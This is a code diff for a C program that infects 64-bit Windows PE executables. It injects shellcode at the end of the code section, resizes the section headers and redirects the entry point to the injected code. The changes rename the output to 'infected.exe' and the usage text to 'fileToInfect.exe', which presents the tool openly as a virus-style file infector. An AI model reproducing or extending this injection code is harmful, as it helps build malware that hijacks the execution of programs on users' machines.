@@ -129,7 +129,7 @@ static int  getShellcode(file *bin, uint32_t alignment) {
 static int  writeToFile(file bin) {
   int   fd;
 
-  if ((fd = open("./packed.exe", O_CREAT | O_TRUNC | O_WRONLY, S_IRWXU | S_IRGRP | S_IXGRP | S_IXOTH | S_IROTH)) == -1)
+  if ((fd = open("./infected.exe", O_CREAT | O_TRUNC | O_WRONLY, S_IRWXU | S_IRGRP | S_IXGRP | S_IXOTH | S_IROTH)) == -1)
     return (-1);
   write(fd, bin.start, bin.size);
   close(fd);
@@ -163,11 +163,6 @@ static int  resizeCodeSection(file *bin, file shellcode) {
 
   optHeader = ((void *)bin->header) + sizeof(PE64_Ehdr);
   shHeader = ((void *)optHeader) + bin->header->optHeaderSize;
-  /* dprintf(1, "Entry point in file: %p\n", shHeader->paddr + (optHeader->entryPoint - shHeader->vaddr)); */
-  /* dprintf(1, "Shellcode size: %zu\n", shellcode.size); */
-  /* copyContent(bin, shHeader->paddr + (optHeader->entryPoint - shHeader->vaddr), shellcode.start, 2, 1); */
-  optHeader = ((void *)bin->header) + sizeof(PE64_Ehdr);
-  shHeader = ((void *)optHeader) + bin->header->optHeaderSize;
   copyContent(bin, shHeader->paddr + shHeader->memsz, shellcode.start, align(shellcode.size, optHeader->fileAlignment), 0);
   optHeader = ((void *)bin->header) + sizeof(PE64_Ehdr);
   optHeader->sizeofcode += shellcode.size;
@@ -176,6 +171,7 @@ static int  resizeCodeSection(file *bin, file shellcode) {
   optHeader->entryPoint = shHeader->vaddr + shHeader->memsz;
   shHeader->memsz += shellcode.size;
   shHeader->filesz += align(shellcode.size, optHeader->fileAlignment);
+  // TODO only if symtbl is after code section
   bin->header->symTbl += align(shellcode.size, optHeader->fileAlignment);
   i = 0;
   codeSection = ((void *)optHeader) + bin->header->optHeaderSize;
@@ -195,7 +191,7 @@ int     main(int argc, const char **argv) {
   PE64_OptHdr   *optHeader;
 
   if (argc != 2) {
-    dprintf(2, "Not right number or arguments\n");
+    dprintf(2, "Usage: %s fileToInfect.exe\n", argv[0]);
     return (1);
   }
   if (getHeader(argv[1], &bin) == -1)
